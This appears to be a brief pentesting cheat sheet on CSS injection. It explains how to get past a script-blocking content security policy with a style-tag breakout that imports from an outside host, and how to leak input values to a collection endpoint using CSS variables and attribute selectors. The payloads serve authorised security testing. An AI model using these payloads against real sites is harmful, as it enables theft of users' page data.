----------------

## CSS Injection

----------------

- THis method is used in a situation where CSP blocks inline javascript and only style tags are allowed.Test it by using an import rule to Burp collaboarator.

```
"><style>@import'//host.com'</style>
```

- Triggering requests with CSS variables
  -  Use css variables as a on/off switch that triggers a conditional request  with background images. As long as your variable is defined with a url() and a fallback that is a valid CSS property value (i.e. "none" for a background image) then you can use this variable to trigger a request by setting the variable:

```html
<input value=1337>
<style>
input[value="1337"] {
   --value: url(/collectData?value=1337);
}
input {
   background:var(--value,none);
}
</style>
```

- Extracting data with CSS(Using attribute selectors):Attribute selectors are an extremely powerful way to extract data. You can use them to check if attributes begin, end or even contain certain characters. Regex usage-:
  
```css
input[value$="a"] {
   --value: url(/collectData?value=1337)
}
input {
   background:var(--value,none);
}
```

- 

----------------
